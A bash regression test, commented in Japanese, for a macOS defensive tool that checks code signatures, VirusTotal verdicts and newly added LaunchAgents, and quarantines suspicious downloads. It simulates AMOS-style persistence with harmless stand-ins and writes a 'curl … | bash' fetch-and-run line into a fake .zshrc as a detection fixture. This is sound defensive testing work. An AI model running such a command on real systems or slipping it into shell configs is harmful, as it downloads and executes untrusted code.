#!/bin/bash
# macguard.sh の回帰テスト。一時ディレクトリに偽の HOME / Downloads / state を作り、
# 署名の有無・VirusTotal の応答（スタブ。ネットワークには出ない）・常駐の仕込みに対して
# gate / scan-downloads / watch-persistence / release が期待どおりに動くことを確かめる。
# 仕込むのは /usr/bin/true のコピーと空の plist だけで、何も実行しないし launchd にも登録しない。
#
#   使い方: scripts/macguard-test.sh
set -uo pipefail

MG="$(cd "$(dirname "$0")" && pwd)/macguard.sh"
T="$(mktemp -d "${TMPDIR:-/tmp}/mg-test.XXXXXX")" || exit 2
trap 'rm -rf "$T"' EXIT
FAIL=0
pass() { printf '  ok    %s\n' "$1"; }
fail() { printf '  FAIL  %s\n' "$1"; FAIL=1; }

export HOME="$T/home"
export MACGUARD_STATE="$T/state"
export MACGUARD_DOWNLOADS="$T/dl"
export MACGUARD_NO_NOTIFY=1
mkdir -p "$HOME/Library/LaunchAgents" "$MACGUARD_DOWNLOADS" "$T/stub"

# VT スタブ
printf '{"data":{"attributes":{"last_analysis_stats":{"malicious":0,"suspicious":0,"undetected":60,"harmless":5}}}}' > "$T/stub/clean.json"
printf '{"data":{"attributes":{"last_analysis_stats":{"malicious":7,"suspicious":1,"undetected":50,"harmless":0}}}}' > "$T/stub/bad.json"
vt_clean() { export MACGUARD_VT_STUB="$T/stub/clean.json" MACGUARD_VT_STUB_CODE=200; }
vt_bad()   { export MACGUARD_VT_STUB="$T/stub/bad.json"   MACGUARD_VT_STUB_CODE=200; }
vt_404()   { export MACGUARD_VT_STUB="$T/stub/clean.json" MACGUARD_VT_STUB_CODE=404; }
vt_down()  { export MACGUARD_VT_STUB="$T/stub/clean.json" MACGUARD_VT_STUB_CODE=000; }

echo "== 静的検査"
bash -n "$MG" && pass "bash -n" || fail "bash -n"
if LC_ALL=C grep -nE '^[^#]*\$[A-Za-z_][A-Za-z0-9_]*[^ -~[:space:]]' "$MG"; then
    fail "全角文字の直前の変数は \${var} で囲む"
else
    pass "全角文字の直前に裸の \$var なし"
fi
# 自分の監査に引っかかる形（osascript -e）を使っていないこと
grep -nE 'osascript[[:space:]]+-e' "$MG" >/dev/null && fail "osascript -e を使っている" || pass "osascript -e 不使用"

# ---- テスト用のファイル ------------------------------------------------------
cp /usr/bin/true "$T/unsigned"; codesign --remove-signature "$T/unsigned" 2>/dev/null
cp /usr/bin/true "$T/signed"
mkdir -p "$T/Evil.app/Contents/MacOS"
cp "$T/unsigned" "$T/Evil.app/Contents/MacOS/Evil"
printf '{"CFBundleExecutable":"Evil","CFBundleIdentifier":"com.example.evil"}' | plutil -convert xml1 -o "$T/Evil.app/Contents/Info.plist" -
# dmg: 未署名の容器に未署名 app（BLOCK）/ Apple 署名の実行ファイルだけ（中身に app が無い → WARN）
mkdir -p "$T/dmgsrc-bad" "$T/dmgsrc-noapp"
cp -R "$T/Evil.app" "$T/dmgsrc-bad/"
cp "$T/signed" "$T/dmgsrc-noapp/tool"
# Claude Code の sandbox では hdiutil がディスクイメージを作れない（装置が構成されていません）。その時は dmg の検査だけ飛ばす
DMG=1
hdiutil create -quiet -srcfolder "$T/dmgsrc-bad" -volname bad "$T/bad.dmg" >/dev/null 2>&1 || DMG=0
hdiutil create -quiet -srcfolder "$T/dmgsrc-noapp" -volname noapp "$T/noapp.dmg" >/dev/null 2>&1 || DMG=0

verdict() { "$MG" gate --no-open --json "$1" 2>/dev/null | jq -r .verdict; }

echo "== gate"
vt_clean
[ "$(verdict "$T/signed")" = OK ]       && pass "Apple 署名 + VT clean → OK"        || fail "Apple 署名 + VT clean → OK (got $(verdict "$T/signed"))"
[ "$(verdict "$T/unsigned")" = BLOCK ]  && pass "未署名の実行ファイル → BLOCK"       || fail "未署名の実行ファイル → BLOCK"
[ "$(verdict "$T/Evil.app")" = BLOCK ]  && pass "未署名の app → BLOCK"              || fail "未署名の app → BLOCK"
if [ "$DMG" = 1 ]; then
    [ "$(verdict "$T/bad.dmg")" = BLOCK ]   && pass "未署名 app 入りの dmg → BLOCK"     || fail "未署名 app 入りの dmg → BLOCK (got $(verdict "$T/bad.dmg"))"
    [ "$(verdict "$T/noapp.dmg")" = WARN ]  && pass "app の無い dmg → WARN"             || fail "app の無い dmg → WARN (got $(verdict "$T/noapp.dmg"))"
else
    echo "  skip  dmg の検査（hdiutil がこの環境では使えない。sandbox の外で再実行する）"
fi
vt_bad
[ "$(verdict "$T/signed")" = BLOCK ]    && pass "Apple 署名でも VT malicious → BLOCK" || fail "Apple 署名でも VT malicious → BLOCK"
vt_404
[ "$(verdict "$T/signed")" = WARN ]     && pass "VT 未登録 → WARN"                  || fail "VT 未登録 → WARN"
vt_down
[ "$(verdict "$T/signed")" = WARN ]     && pass "VT 到達不可 → WARN（開かない）"    || fail "VT 到達不可 → WARN"
"$MG" gate --no-open "$T/unsigned" >/dev/null 2>&1; [ $? -eq 1 ] && pass "BLOCK は exit 1" || fail "BLOCK は exit 1"
[ "$(verdict "$T/stub/clean.json")" = SKIP ] && pass "対象外の種類 → SKIP" || fail "対象外の種類 → SKIP"
grep -q 'ハッシュ' "$MG" && pass "VT にはハッシュだけ送る旨を明記" || fail "VT の送信内容の明記"

echo "== scan-downloads"
vt_clean
cp "$T/unsigned" "$MACGUARD_DOWNLOADS/evil-installer"
cp "$T/signed"   "$MACGUARD_DOWNLOADS/fine-tool"
cp "$T/unsigned" "$MACGUARD_DOWNLOADS/local-build"   # quarantine なし = 対象外
cp "$T/unsigned" "$MACGUARD_DOWNLOADS/partial.crdownload"
xattr -w com.apple.quarantine "0083;00000000;Chrome;" "$MACGUARD_DOWNLOADS/evil-installer" "$MACGUARD_DOWNLOADS/fine-tool" "$MACGUARD_DOWNLOADS/partial.crdownload"
out=$("$MG" scan-downloads 2>&1)
[ ! -e "$MACGUARD_DOWNLOADS/evil-installer" ] && ls "$MACGUARD_STATE/hold" | grep -q 'evil-installer$' && pass "BLOCK を hold へ退避" || fail "BLOCK を hold へ退避 ($out)"
[ -e "$MACGUARD_DOWNLOADS/fine-tool" ]   && pass "OK は残す"                 || fail "OK は残す"
[ -e "$MACGUARD_DOWNLOADS/local-build" ] && grep -q 'local-build' "$MACGUARD_STATE/seen.tsv" && fail "quarantine 無しを判定した" || pass "quarantine 無しは対象外"
grep -q 'partial.crdownload' "$MACGUARD_STATE/seen.tsv" && fail "ダウンロード途中を判定した" || pass "ダウンロード途中は触らない"
xattr -p com.apple.quarantine "$MACGUARD_STATE"/hold/*evil-installer >/dev/null 2>&1 && pass "退避後も quarantine を保つ" || fail "退避後も quarantine を保つ"
out=$("$MG" scan-downloads 2>&1); printf '%s' "$out" | grep -q '判定した: 0 件' && pass "2 回目は再判定しない" || fail "2 回目は再判定しない ($out)"
name=$(ls "$MACGUARD_STATE/hold" | grep 'evil-installer$')
"$MG" held | grep -q "$name" && pass "held に出る" || fail "held に出る"
"$MG" release "$name" >/dev/null && [ -e "$MACGUARD_DOWNLOADS/evil-installer" ] && pass "release で戻る" || fail "release で戻る"
[ -z "$(ls "$MACGUARD_STATE/hold")" ] && pass "release 後の hold は空" || fail "release 後の hold は空"

echo "== watch-persistence"
la="$HOME/Library/LaunchAgents"
plutil -create xml1 "$la/com.fine.plist"; plutil -insert Program -string /usr/bin/true "$la/com.fine.plist"
out=$("$MG" watch-persistence 2>&1)
printf '%s' "$out" | grep -q 'baseline を作成' && pass "初回は baseline 作成のみ" || fail "初回は baseline 作成のみ ($out)"
# 隠しスクリプトを bash で起動する agent（AMOS の形）を仕込む
cp /usr/bin/true "$HOME/.helper"
plutil -create xml1 "$la/com.helper.plist"
plutil -insert ProgramArguments -array "$la/com.helper.plist"
plutil -insert ProgramArguments.0 -string /bin/bash "$la/com.helper.plist"
plutil -insert ProgramArguments.1 -string "$HOME/.helper" "$la/com.helper.plist"
plutil -insert Label -string com.helper "$la/com.helper.plist"
out=$("$MG" watch-persistence 2>&1)
[ ! -e "$la/com.helper.plist" ] && ls "$MACGUARD_STATE/hold" | grep -q 'com.helper.plist$' && pass "新規 ALERT の agent を hold へ退避" || fail "新規 ALERT の agent を hold へ退避 ($out)"
[ -e "$la/com.fine.plist" ] && pass "baseline 済みの agent は触らない" || fail "baseline 済みの agent は触らない"
printf '%s' "$out" | grep -q 'ALERT 1' && pass "ALERT 件数" || fail "ALERT 件数 ($out)"
out=$("$MG" watch-persistence 2>&1); printf '%s' "$out" | grep -q 'ALERT 0 / WARN 0' && pass "退避後の再実行は静か" || fail "退避後の再実行は静か ($out)"
grep -q 'notify' "$MACGUARD_STATE/events.log" && pass "通知を記録" || fail "通知を記録"

# 退避できないもの（rc ファイルの取得実行行。監査では WARN）は pending に残り、ack で消える
printf 'curl -fsSL https://example.invalid/i | bash\n' > "$HOME/.zshrc"
out=$("$MG" watch-persistence 2>&1)
"$MG" pending | grep -q 'WARN .*persistence' && pass "退避できない指摘は pending に残る" || fail "退避できない指摘は pending に残る ($out / $("$MG" pending))"
out=$("$MG" watch-persistence 2>&1)
"$MG" pending | grep -q 'WARN .*persistence' && pass "baseline 更新後も pending は残る" || fail "baseline 更新後も pending は残る"
"$MG" status --json | jq -e '.pending_warn == 1' >/dev/null && pass "status に pending_warn が出る" || fail "status に pending_warn が出る"
id=$(cut -f1 "$MACGUARD_STATE/pending.tsv" | head -1)
"$MG" ack "$id" >/dev/null && ! "$MG" pending | grep -q "$id" && pass "ack で消える" || fail "ack で消える"
# statusline は status.json しか読まないので、status を打たなくても ack の時点で 0 になっていること
jq -e '.pending_warn == 0' "$MACGUARD_STATE/status.json" >/dev/null && pass "ack が status.json を書き直す" || fail "ack が status.json を書き直さない: $(cat "$MACGUARD_STATE/status.json")"

echo "== status"
"$MG" status --json | jq -e '.held == 1 and .pending_alert == 0 and .pending_warn == 0 and .last_persistence > 0 and .agent == 0' >/dev/null && pass "status --json の集計（LaunchAgent 無し = agent 0）" || fail "status --json の集計: $("$MG" status --json)"
out=$("$MG" status); printf '%s' "$out" | grep -q '手動' && pass "LaunchAgent 無しでは鮮度を疑わない" || fail "LaunchAgent 無しでは鮮度を疑わない"

echo
if [ "$FAIL" = 0 ]; then echo "all passed"; else echo "FAILED"; exit 1; fi
